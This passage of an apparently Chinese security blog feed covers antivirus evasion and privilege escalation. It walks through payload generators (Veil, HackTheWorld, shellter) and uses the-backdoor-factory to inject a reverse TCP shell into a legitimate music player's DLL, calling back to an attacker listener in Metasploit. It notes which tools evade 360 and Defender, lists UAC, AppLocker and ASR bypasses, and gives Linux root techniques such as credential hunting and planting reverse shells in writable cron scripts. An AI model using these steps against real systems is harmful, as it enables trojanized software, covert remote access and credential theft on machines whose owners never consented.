class="line"></span><br></pre></td></tr></table></figure><p>msf设置：</p><p>若选择bat文件，秩序msf执行监听即可</p><p>若选择rc文件，需要使用<code>-r</code>参数设置：<code>msfconsole -r /var/lib/veil/output/handlers/shell.rc</code></p><p>被攻击机执行生成的可执行文件即可收到会话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole -r /var/lib/veil/output/handlers/shell.rc</span><br><span class="line">...省略...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information       Connection</span><br><span class="line">  --  ----  ----                     -----------       ----------</span><br><span class="line">  1         meterpreter x86/windows  WIN7\haha @ WIN7  192.168.3.17:4444 -&gt; 192.168.3.21:49172 (192.168.3.21)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h4 id="3-venom"><a href="#3-venom" class="headerlink" title="3.venom"></a>3.venom</h4><p>github项目地址：<a href="https://github.com/r00t-3xp10it/venom">https://github.com/r00t-3xp10it/venom</a></p><p>安装不麻烦，就是使用中莫名其妙报错导致不能正常执行得到想要的&#x2F;(ㄒoㄒ)&#x2F;~~，法克，这个框架作者实时维护，可以一试。</p><h4 id="4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行"><a href="#4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行" class="headerlink" title="4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)"></a>4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)</h4><p>github项目地址：<a href="https://github.com/stormshadow07/HackTheWorld">https://github.com/stormshadow07/HackTheWorld</a></p><p>这里记录一个小问题，安装没有报错，但执行时提示没有termcolor，pip安装termcolor时提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.</span><br></pre></td></tr></table></figure><p>只需执行<code>python -m pip install --upgrade setuptools</code>,升级一下setuptools就可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[?] Enter Payload TYPE [tcp,https,tcp_dns]: tcp #选择协议tcp,https,tcp_dns</span><br><span class="line"> [+] Payload TYPE : tcp</span><br><span class="line"> [?] Enter LHOST for Payload [LHOST] : 192.168.3.17  #设置地址</span><br><span class="line"> [+] LHOST for Payload [LPORT] : 192.168.3.17</span><br><span class="line"> [?] Enter LPORT for Payload : 1234#设置端口</span><br><span class="line"> [+] LPORT for Payload : 1234</span><br><span class="line">...省略...</span><br><span class="line"> [?] Enter the Key to Encrypt Shellcode with : xor#选择编码方式，有xor、base64</span><br><span class="line">...省略...</span><br><span class="line">[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?1#是否执行bypass</span><br><span class="line">...省略...</span><br><span class="line">[+] Final File with Manifest [./result/final_1234.exe]#生成文件路径</span><br></pre></td></tr></table></figure><p>但是比较大500kb+，一般马的大小100kb左右</p><h4 id="5-shellter（目前VT：24-66，可过360）"><a href="#5-shellter（目前VT：24-66，可过360）" class="headerlink" title="5.shellter（目前VT：24&#x2F;66，可过360）"></a>5.shellter（目前VT：24&#x2F;66，可过360）</h4><p>动态 shellcode 注入工具，可将shellcode注入到其它程序上，目前只能注入32位的可执行文件。</p><p>官网：<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> </p><p>主程序是.exe文件所以在windows下可以直接使用，在linux上运行需要安装wine环境来运行。</p><p>kali安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update       //更新一下</span><br><span class="line">apt-get install shellter    //直接apt在线安装</span><br></pre></td></tr></table></figure><p>安装完成后再&#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;shellter  这个文件夹。hellter_Backups文件夹是注入文件后备份的文件夹，会自动把原文件备份一个到这个文件夹下。</p><p>过程就不贴图了，很简单，列一下会出现的几个要选择的点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Choose Operation Mode - Auto/Manual (A/M/H)： //选择模式 A 自动模式自动注入后门，M高级模式，H帮助</span><br><span class="line">PE Target：            // 32位可执行文件绝对路径</span><br><span class="line">Enable Stealth Mode? (Y/N/H): Y               //是否启用隐身模式 输入Y启用 建议N</span><br><span class="line">Use a listed payload or custom? (L/C/H): L         //选择以列出的Payload还是自定义的</span><br><span class="line">Select payload by index: 1      //选择payload的序号</span><br><span class="line">SET LHOST：   //设置反弹回来的IP 本机</span><br><span class="line">SET LPORT：   //设置接收反弹的端口</span><br></pre></td></tr></table></figure><h4 id="6-the-backdoor-factory"><a href="#6-the-backdoor-factory" class="headerlink" title="6.the-backdoor-factory"></a>6.the-backdoor-factory</h4><p>github项目：<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><strong>这个工具很强，但是做出来的东西VT检测将近50%，主流的杀软都过不了。。。</strong></p><p>使用之前先pip安装capstone、pefile</p><p>这是一个后门植入工具，原理是可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在程序执行的时候，jmp 到代码段，来触发 payload。</p><p>常用的命令有</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">-h：帮助</span><br><span class="line">-f ：测试文件的路径</span><br><span class="line">-s show：查看被测试的文件可用的payload</span><br><span class="line">-H HOST：指定回连的IP</span><br><span class="line">-P PORT：指定回连的端口</span><br><span class="line">-J, --cave_jumping    Select this options if you want to use code cave</span><br><span class="line">                       jumping to further hide your shellcode in the binary.</span><br><span class="line">-a, --add_new_section</span><br><span class="line">                       Mandating that a new section be added to the exe</span><br><span class="line">                       (better success) but less av avoidance</span><br><span class="line">-U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE</span><br><span class="line">                       User supplied shellcode, make sure that it matches the</span><br><span class="line">                       architecture that you are targeting.</span><br><span class="line">-c：测试文件可利用缝隙大小</span><br><span class="line">-l SHELL_LEN, --shell_length=SHELL_LEN</span><br><span class="line">                       For use with -c to help find code caves of different</span><br><span class="line">                       sizes</span><br><span class="line">-o OUTPUT, --output-file=OUTPUT</span><br><span class="line">                       The backdoor output file</span><br><span class="line">-n NSECTION, --section=NSECTION</span><br><span class="line">                       New section name must be less than seven characters</span><br><span class="line">-d DIR, --directory=DIR</span><br><span class="line">                       This is the location of the files that you want to</span><br><span class="line">                       backdoor. You can make a directory of file backdooring</span><br><span class="line">                       faster by forcing the attaching of a codecave to the</span><br><span class="line">                       exe by using the -a setting.</span><br><span class="line">-w, --change_access   This flag changes the section that houses the codecave</span><br><span class="line">                       to RWE. Sometimes this is necessary. Enabled by</span><br><span class="line">                       default. If disabled, the backdoor may fail.</span><br><span class="line">-i, --injector        This command turns the backdoor factory in a hunt and</span><br><span class="line">                       shellcode inject type of mechanism. Edit the target</span><br><span class="line">                       settings in the injector module.</span><br><span class="line">-u SUFFIX, --suffix=SUFFIX</span><br><span class="line">                       For use with injector, places a suffix on the original</span><br><span class="line">                       file for easy recovery</span><br><span class="line">-D, --delete_original</span><br><span class="line">                       For use with injector module.  This command deletes</span><br><span class="line">                       the original file.  Not for use in production systems.</span><br><span class="line">                       *Author not responsible for stupid uses.*</span><br><span class="line">-O DISK_OFFSET, --disk_offset=DISK_OFFSET</span><br><span class="line">                       Starting point on disk offset, in bytes. Some authors</span><br><span class="line">                       want to obfuscate their on disk offset to avoid</span><br><span class="line">                       reverse engineering, if you find one of those files</span><br><span class="line">                       use this flag, after you find the offset.</span><br><span class="line">-S：检测文件是否支持后门</span><br><span class="line">-M, --cave-miner      Future use, to help determine smallest shellcode</span><br><span class="line">                       possible in a PE file</span><br><span class="line">-q, --no_banner       Kills the banner.</span><br><span class="line">-v, --verbose         For debug information output.</span><br><span class="line">-T IMAGE_TYPE, --image-type=IMAGE_TYPE</span><br><span class="line">                       ALL, x86, or x64 type binaries only. Default=ALL</span><br><span class="line">-Z, --zero_cert       Allows for the overwriting of the pointer to the PE</span><br><span class="line">                       certificate table effectively removing the certificate</span><br><span class="line">                       from the binary for all intents and purposes.</span><br><span class="line">-R, --runas_admin     EXPERIMENTAL Checks the PE binaries for</span><br><span class="line">                       &#x27;requestedExecutionLevel level=&quot;highestAvailable&quot;&#x27;. If</span><br><span class="line">                       this string is included in the binary, it must run as</span><br><span class="line">                       system/admin. If not in Support Check mode it will</span><br><span class="line">                       attmept to patch highestAvailable into the manifest if</span><br><span class="line">                       requestedExecutionLevel entry exists.</span><br><span class="line">-L, --patch_dll       Use this setting if you DON&#x27;T want to patch DLLs.</span><br><span class="line">                       Patches by default.</span><br><span class="line">-F FAT_PRIORITY, --fat_priority=FAT_PRIORITY</span><br><span class="line">                       For MACH-O format. If fat file, focus on which arch to</span><br><span class="line">                       patch. Default is x64. To force x86 use -F x86, to</span><br><span class="line">                       force both archs use -F ALL.</span><br><span class="line">-B BEACON, --beacon=BEACON</span><br><span class="line">                       For payloads that have the ability to beacon out, set</span><br><span class="line">                       the time in secs</span><br><span class="line">-m PATCH_METHOD, --patch-method=PATCH_METHOD</span><br><span class="line">                       Patching methods for PE files, &#x27;manual&#x27;,&#x27;automatic&#x27;,</span><br><span class="line">                       replace and onionduke</span><br><span class="line">-b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY</span><br><span class="line">                       For onionduke. Provide your desired binary.</span><br><span class="line">-X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X</span><br><span class="line">                       to support XP. By default the binary will crash on XP</span><br><span class="line">                       machines (e.g. sandboxes)</span><br><span class="line">-A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table</span><br><span class="line">                       is created in a new section, by calling this flag it</span><br><span class="line">                       will be put in a code cave.  This can cause bianry</span><br><span class="line">                       failure is some cases. Test on target binaries first.</span><br><span class="line">-C, --code_sign       For those with codesigning certs wishing to sign PE</span><br><span class="line">                       binaries only. Name your signing key and private key</span><br><span class="line">                       signingcert.cer and signingPrivateKey.pem repectively</span><br><span class="line">                       in the certs directory it&#x27;s up to you to obtain</span><br><span class="line">                       signing certs.</span><br><span class="line">-p, --preprocess      To execute preprocessing scripts in the preprocess</span><br><span class="line">                       directory</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用举例，本次以酷狗音乐的最新安装程序为例</p><p>安装酷狗音乐，打开Process Explorer查找该软件运行的dll库，本次以msvcp140.dll为例。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll#查看可利用的payload</span><br><span class="line">...省略...</span><br><span class="line">The following WinIntelPE32s are available: (use -s)</span><br><span class="line">   cave_miner_inline</span><br><span class="line">   iat_reverse_tcp_inline</span><br><span class="line">   iat_reverse_tcp_inline_threaded</span><br><span class="line">   iat_reverse_tcp_stager_threaded</span><br><span class="line">   iat_user_supplied_shellcode_threaded</span><br><span class="line">   meterpreter_reverse_https_threaded</span><br><span class="line">   reverse_shell_tcp_inline#这里选择此模块获取shell</span><br><span class="line">   reverse_tcp_stager_threaded</span><br><span class="line">   user_supplied_shellcode_threaded</span><br><span class="line">root@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.3.17#选择模块，设置回连ip，port</span><br><span class="line"> ...省略...</span><br><span class="line">[*] Available caves: </span><br><span class="line">1. Section Name: .data; Section Begin: 0x60800 End: 0x62000; Cave begin: 0x61e86 End: 0x61ffc; Cave Size: 374</span><br><span class="line">2. Section Name: .idata; Section Begin: 0x62000 End: 0x63600; Cave begin: 0x63416 End: 0x635fc; Cave Size: 486</span><br><span class="line">3. Section Name: None; Section Begin: None End: None; Cave begin: 0x63634 End: 0x6380a; Cave Size: 470</span><br><span class="line">**************************************************</span><br><span class="line">[!] Enter your selection: 1#此处选择1（随意选）</span><br><span class="line">[!] Using selection: 1 </span><br><span class="line">...省略...</span><br><span class="line">File msvcp140.dll is in the &#x27;backdoored&#x27; directory #生成文件的存储路径</span><br></pre></td></tr></table></figure><p>攻击机启动msf，进入<code>handler</code>，设置<code> set payload windows/shell_reverse_tcp,</code>以及回连port，ip，开启监听。</p><p>将生成的新dll文件（大小与原来的不一样）替换原来的dll文件，启动软件，msf即可得到一个会话。</p><p>注：选择的文件可能会导致软件不能正常运行。。。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常见杀软检测技术及方法 </tag>
            
            <tag> msf三种免杀方法 </tag>
            
            <tag> veil </tag>
            
            <tag> venom </tag>
            
            <tag> hacktheworld </tag>
            
            <tag> shellter </tag>
            
            <tag> the-backdoor-factory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass</title>
      <link href="/2020/10/02/bypass/"/>
      <url>/2020/10/02/bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1.bypassuac"></a>1.bypassuac</h2><h3 id="1-msf-bypassuac"><a href="#1-msf-bypassuac" class="headerlink" title="1.msf bypassuac"></a>1.msf bypassuac</h3><p>之前已经做过总结：<a href="https://ahiahiahiahia.github.io/2020/10/01/windows%E6%8F%90%E6%9D%83/">https://ahiahiahiahia.github.io/2020/10/01/windows%E6%8F%90%E6%9D%83/</a></p><h3 id="2-UACME"><a href="#2-UACME" class="headerlink" title="2.UACME"></a>2.UACME</h3><p>项目地址：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>这是一个很大的项目，很实用，里面有很多文章，随便举一个</p><p><strong>Nishang中的Invoke-PsUACme.ps1</strong></p><p><a href="https://blog.csdn.net/xiaoi123/article/details/86292165">https://blog.csdn.net/xiaoi123/article/details/86292165</a></p><h3 id="3-CVE-2019-1388：Windows-UAC-本地提权"><a href="#3-CVE-2019-1388：Windows-UAC-本地提权" class="headerlink" title="3.CVE-2019-1388：Windows UAC 本地提权"></a>3.CVE-2019-1388：Windows UAC 本地提权</h3><p>参考一下，以后复现。。。<a href="https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w">https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w</a></p><h3 id="4-ComputerDefaults-exe"><a href="#4-ComputerDefaults-exe" class="headerlink" title="4.ComputerDefaults.exe"></a>4.ComputerDefaults.exe</h3><p>老规矩，自己看。。。<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA</a> 或者 <a href="https://blog.csdn.net/qq_36119192/article/details/104292591?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">https://blog.csdn.net/qq_36119192/article/details/104292591?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</a></p><h2 id="2-bypassASR"><a href="#2-bypassASR" class="headerlink" title="2.bypassASR"></a>2.bypassASR</h2><p><a href="https://lengjibo.github.io/asr/">https://lengjibo.github.io/asr/</a></p><p>创建进程、wmi创建进程、office创建子进程、wmi和psexec调用</p><h2 id="3-bypassApplocker"><a href="#3-bypassApplocker" class="headerlink" title="3.bypassApplocker"></a>3.bypassApplocker</h2><p><a href="https://lengjibo.github.io/appbypass/">https://lengjibo.github.io/appbypass/</a></p><p>msbuild.exe、mshta.exe、msiexec、regsvr32.exe、rundll32.exe</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypassuac </tag>
            
            <tag> bypassASR </tag>
            
            <tag> bypassApplocker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权(user-&gt;root)</title>
      <link href="/2020/10/01/linux%E6%8F%90%E6%9D%83-user-root/"/>
      <url>/2020/10/01/linux%E6%8F%90%E6%9D%83-user-root/</url>
      
        <content type="html"><![CDATA[<p>当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。</p><span id="more"></span><p><strong>Linux提权的前提：</strong></p><ul><li>拿到了一个低权限的账号</li><li>能上传和下载文件</li><li>机器上有python、java、perl等环境（非必须项）</li></ul><h2 id="1-密码相关操作"><a href="#1-密码相关操作" class="headerlink" title="1.密码相关操作"></a>1.密码相关操作</h2><p><strong>1.查找带有密码相关的文件</strong></p><p><code>grep --color=auto -rnw &#39;/&#39; -ie  &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</code></p><p><strong>2.查看过期的密码</strong></p><p><code>cat /etc/security/opasswd</code></p><p><code>id</code>：查看权限</p><p><strong>3.查看用户最后编辑的文件</strong></p><p><code>find / -mmin -10 2&gt;/dev/null |grep -Ev &quot;^/proc&quot;</code></p><p><strong>4.查看内存中密码</strong></p><p>一些服务的密码可能存在内存中：<code>strings /dev/mem -n10 | grep -i pass</code></p><p><strong>5.查找敏感文件</strong></p><p>查找带有password的文件：<code>locate password | more</code></p><h2 id="2-计划任务cron"><a href="#2-计划任务cron" class="headerlink" title="2.计划任务cron"></a>2.计划任务cron</h2><p>查看计划任务：<code>cat /var/log/cronlog</code></p><p>编辑计划任务：<code>/etc/crontab</code></p><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是&#x2F;etc&#x2F;内系统的计划任务可以被列出,默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p><p><code>ls -l /etc/cron.[d]|[daily]|[hourly]|[monthly]|[weekly]</code></p><p>使用该命令，列出的文件，查看这四个文件夹内的文件，查看是否允许其他用户修改。如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p><h2 id="3-内核漏洞：exp"><a href="#3-内核漏洞：exp" class="headerlink" title="3.内核漏洞：exp"></a>3.内核漏洞：exp</h2><p>查看linux的发行版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue  (Debian，ubuntu系列)</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release (红帽，centos系列)</span><br></pre></td></tr></table></figure><p>查看Linux内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel  （查询kernel rpm包，不推荐用，一个系统可以拥有多个版本包）</span><br><span class="line">dmesg |grep linux</span><br><span class="line">ls /boot |grep vmlinuz</span><br></pre></td></tr></table></figure><p><code>dpkg -l</code>：查看已经安装的程序</p><p>提权：</p><p>1.可以用kali自searchsploit来搜索exploitdb中的漏洞利用代码<code>searchsploit linux Debian 版本</code></p><p>2.通过现有的exp上传到目标主机，执行exp，获得shell权限：<a href="https://github.com/SecWiki/linux-kernel-exploits%EF%BC%88%E6%9C%AC%E6%9D%A1%E5%8F%AF%E4%BB%A5%E5%92%8C%E4%B8%8B%E9%9D%A2%E4%B8%80%E6%9D%A1%E7%BB%93%E5%90%88%E4%BD%BF%E7%94%A8%EF%BC%89">https://github.com/SecWiki/linux-kernel-exploits（本条可以和下面一条结合使用）</a></p><p>3.工具：linux-exploit-suggester，可以识别当前系统的内核版本以及架构并且尝试查找可以利用的exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">haha@haha-virtual-machine:~/linux-exploit-suggester-master$ ./linux-exploit-suggester.sh</span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 4.15.0</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 16.04</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">74 kernel space exploits</span><br><span class="line">45 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="line"></span><br><span class="line">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19</span><br><span class="line">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="line">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-15666] XFRM_UAF</span><br><span class="line"></span><br><span class="line">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: </span><br><span class="line">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2018-1000001] RationalLove</span><br><span class="line"></span><br><span class="line">   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: debian=9&#123;libc6:2.24-11+deb9u1&#125;,ubuntu=16.04.3&#123;libc6:2.23-0ubuntu9&#125;</span><br><span class="line">   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c</span><br><span class="line">   Comments: kernel.unprivileged_userns_clone=1 required</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611</span><br><span class="line">   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c</span><br><span class="line">   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries</span><br></pre></td></tr></table></figure><p>Linux_Exploit_Suggester同上类似</p><p>Linux本地提权漏洞复现与检测思路：<a href="https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA">https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA</a></p><p>其他内核提权</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><h2 id="4-利用root权限运行的服务提权"><a href="#4-利用root权限运行的服务提权" class="headerlink" title="4.利用root权限运行的服务提权"></a>4.利用root权限运行的服务提权</h2><p>如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。</p><p>可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。</p><p><code>netstat -antup </code>显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被利用。</p><p><code>ps aux </code>列出哪些进程正在运行</p><p><code>ps -aux | grep root </code>列出以root身份运行的服务。</p><p>例如mysql以root运行，则mysql执行的命令将以root运行，可以参考：<a href="https://www.jb51.net/article/51767.htm">https://www.jb51.net/article/51767.htm</a></p><h2 id="5-sudo提权"><a href="#5-sudo提权" class="headerlink" title="5.sudo提权"></a>5.sudo提权</h2><p>在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用<strong>sudo</strong>可以升级特权。</p><h3 id="1-sudo基本知识"><a href="#1-sudo基本知识" class="headerlink" title="1.sudo基本知识"></a>1.sudo基本知识</h3><h4 id="1-什么是sudo"><a href="#1-什么是sudo" class="headerlink" title="1.什么是sudo"></a>1.什么是sudo</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 